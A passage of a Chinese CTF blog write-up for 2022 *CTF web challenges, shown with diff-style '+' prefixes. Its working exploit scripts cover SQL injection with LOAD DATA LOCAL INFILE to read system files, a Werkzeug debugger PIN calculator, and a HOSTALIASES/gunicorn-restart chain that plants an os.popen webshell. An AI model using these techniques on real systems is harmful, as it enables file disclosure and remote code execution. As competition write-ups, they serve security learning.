+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/m</span>achine-id<br><span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_id<br><span class="hljs-regexp">/proc/</span>self/cgroup<br></code></pre></td></tr></table></figure>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54648419/article/details/123632203">https://blog.csdn.net/weixin_54648419&#x2F;article&#x2F;details&#x2F;123632203</a><br>脚本读取文件内容 python3.8</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> requests,random<br><span class="hljs-keyword">session</span> = requests.<span class="hljs-keyword">Session</span>()<br><span class="hljs-built_in">table_name</span>  = &quot;&quot;.<span class="hljs-keyword">join</span>(random.sample(<span class="hljs-string">&#x27;zyxwvutsrqponmlkjihgfedcba&#x27;</span>,<span class="hljs-number">5</span>))<br>file = <span class="hljs-string">&#x27;/sys/class/net/eth0/address&#x27;</span><br>file = <span class="hljs-string">&#x27;/etc/machine-id&#x27;</span><br>file=<span class="hljs-string">&#x27;/proc/self/cgroup&#x27;</span><br>payload1 = f<span class="hljs-string">&#x27;&#x27;&#x27;1&#x27;</span>;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> &#123;<span class="hljs-built_in">table_name</span>&#125;(<span class="hljs-type">name</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">30000</span>));<span class="hljs-keyword">load</span> data  <span class="hljs-keyword">local</span> infile &quot;&#123;file&#125;&quot; <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> ctf.&#123;<span class="hljs-built_in">table_name</span>&#125; FIELDS TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\n&#x27;</span>;#<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">payload2 = f&#x27;&#x27;&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3,4,(select GROUP_CONCAT(NAME) from ctf.&#123;table_name&#125;)#&#x27;&#x27;&#x27;</span><br>paramsGet1 = &#123;&quot;note_id&quot;:payload1&#125;<br>paramsGet2 = &#123;&quot;note_id&quot;:payload2&#125;<br>headers = &#123;&quot;Cache-Control&quot;:&quot;max-age=0&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;&#125;<br>cookies = &#123;&quot;session&quot;:&quot;eyJjc3JmX3Rva2VuIjoiNjU5MmViODdhMjgwOGE4OTY0ZTRjMmU1Y2RlMWIxNGNiODM4MmNiNSIsInVzZXJuYW1lIjoiYWFhIn0.YlpeQg.VAhhSpogG4OT1bAytxIdRvyCxYk&quot;&#125;<br><br>response1 = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(&quot;http://121.37.153.47:5002/view&quot;, params=paramsGet1, headers=headers, cookies=cookies)<br>response2 = <span class="hljs-keyword">session</span>.<span class="hljs-keyword">get</span>(&quot;http://121.37.153.47:5002/view&quot;, params=paramsGet2, headers=headers, cookies=cookies)<br>print(response2.text)<br></code></pre></td></tr></table></figure>
+<p>算pin</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#sha1<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctf&#x27;</span># <span class="hljs-regexp">/etc/</span>passwd<br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,# 默认值<br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,# 默认值<br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> # 报错得到<br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485723369475&#x27;</span>,#  <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address <span class="hljs-number">16</span>进制转<span class="hljs-number">10</span>进制<br>    #machine_id由三个合并(docker就<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)：<span class="hljs-number">1</span>.<span class="hljs-regexp">/etc/m</span>achine-id <span class="hljs-number">2</span>.<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random<span class="hljs-regexp">/boot_id 3./</span>proc<span class="hljs-regexp">/self/</span>cgroup<br>    <span class="hljs-string">&#x27;1cc402dd0e11d5ae18db04a6de87223d5a46d823f27edfa2c6c973c7e80fd24731bd56fc969e13f96e1868aa82dcde32&#x27;</span>#  <span class="hljs-regexp">/proc/</span>self/cgroup<br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit in chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> not bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> isinstance(bit, str):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(b<span class="hljs-string">&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = None<br><span class="hljs-keyword">if</span> num is None:<br>    h.update(b<span class="hljs-string">&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-keyword">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =None<br><span class="hljs-keyword">if</span> rv is None:<br>    <span class="hljs-keyword">for</span> group_size in <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> len(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.<span class="hljs-keyword">join</span>(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x in range(<span class="hljs-number">0</span>, len(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-keyword">print</span>(rv)<br></code></pre></td></tr></table></figure>
+<h3 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h3><p>有一次修改环境变量的机会——&gt;从wget本地开的另一个服务获取到随机的lotto结果——&gt;和<br>可控的预测结果匹配——&gt;相同返回flag<br>如果wget没有获取到新的flag，那lotto结果就会是上局的结果，是已知的，就能通过。<br>这里是空的 (´･-･)ﾉ㊫<br>因此我通过修改环境变量PATH直接把wget拒之门外了，为了防止ban了其他的可能对正常流程影响的函数，就用通配符限制了一下</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">/usr/bin/ <span class="hljs-symbol">:/usr/bin/</span> ?<span class="hljs-symbol">:/usr/bin/</span>???<span class="hljs-symbol">:/usr/bin/</span>?????<span class="hljs-symbol">:/usr/bin/</span>?????*<br></code></pre></td></tr></table></figure>
+<h3 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h3><p>当上传的forecast.txt文件内容与lotto_result.txt文件内容相符时，可以获得flag<br>POC:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, make_response<br><span class="hljs-keyword">import</span> mimetypes<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><br>    r = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">from flask import Flask,request</span><br><span class="hljs-string">import os</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">app = Flask(__name__)</span><br><span class="hljs-string">@app.route(&quot;/test&quot;, methods=[&#x27;GET&#x27;])</span><br><span class="hljs-string">def test():</span><br><span class="hljs-string">    a = request.args.get(&#x27;a&#x27;)</span><br><span class="hljs-string">    a = os.popen(a)</span><br><span class="hljs-string">    a = a.read()</span><br><span class="hljs-string">    return str(a)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &quot;__main__&quot;:</span><br><span class="hljs-string">    app.run(debug=True,host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>    response = make_response(r)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/plain&#x27;</span><br>    response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=app.py&#x27;</span><br>    <span class="hljs-keyword">return</span> response<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>,host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure>
+<p> 题目使用gunicorn部署，app.py在改变的情况下并不会实时加载。但gunicorn使用一种pre-forked worker的机制，当某一个worker超时以后，就会让gunicorn重启该worker，让worker超时的POC如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">timeout</span> <span class="hljs-number">50</span> nc ip <span class="hljs-number">53000</span> &amp;<br><span class="hljs-attribute">timeout</span> <span class="hljs-number">50</span> nc ip <span class="hljs-number">53000</span> &amp;<br><span class="hljs-attribute">timeout</span> <span class="hljs-number">50</span> nc ip <span class="hljs-number">53000</span><br></code></pre></td></tr></table></figure>
+<p>完整poc：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import os<br>import time<br>import subprocess<br><br>s = requests.session()<br><br>base_url = <span class="hljs-string">&#x27;http://124.223.208.221:53000/&#x27;</span><br>url_upload = base_url + <span class="hljs-string">&#x27;forecast&#x27;</span><br>proxies = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://127.0.0.1:8080&#x27;</span><br>&#125;<br><br>r = s.post(<span class="hljs-attribute">url</span>=url_upload, <span class="hljs-attribute">proxies</span>=proxies, files=&#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;hosts&quot;</span>, open(<span class="hljs-string">&#x27;hosts&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>))&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br><br>url_env = base_url + <span class="hljs-string">&#x27;lotto&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;lotto_key&#x27;</span>: <span class="hljs-string">&#x27;HOSTALIASES&#x27;</span>,<br>    <span class="hljs-string">&#x27;lotto_value&#x27;</span>: <span class="hljs-string">&#x27;/app/guess/forecast.txt&#x27;</span><br>&#125;<br>r = s.post(<span class="hljs-attribute">url</span>=url_env, <span class="hljs-attribute">data</span>=data)<br><br>subprocess.Popen(<span class="hljs-string">&#x27;./exploit.sh&#x27;</span>, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-comment"># os.system(&#x27;./exploit.sh&#x27;)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 53):<br>    <span class="hljs-built_in">print</span>(i)<br>    time.sleep(1)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url_shell = base_url + <span class="hljs-string">&#x27;test?a=env&#x27;</span><br>    <span class="hljs-built_in">print</span>(url_shell)<br>    r = s.<span class="hljs-built_in">get</span>(url_shell)<br>    <span class="hljs-built_in">print</span>(r.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;*ctf&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        break<br></code></pre></td></tr></table></figure>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">在这里插入代码片<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2022-xingCTF-WEB</div>
+      <div>http://example.com/2023/04/20/2022-xingCTF-WEB/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/2022-%E5%AE%89%E6%B4%B5%E6%9D%AF/" title="2022-安洵杯">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022-安洵杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/2022-NCTF/" title="2022-NCTF">
+                        <span class="hidden-mobile">2022-NCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
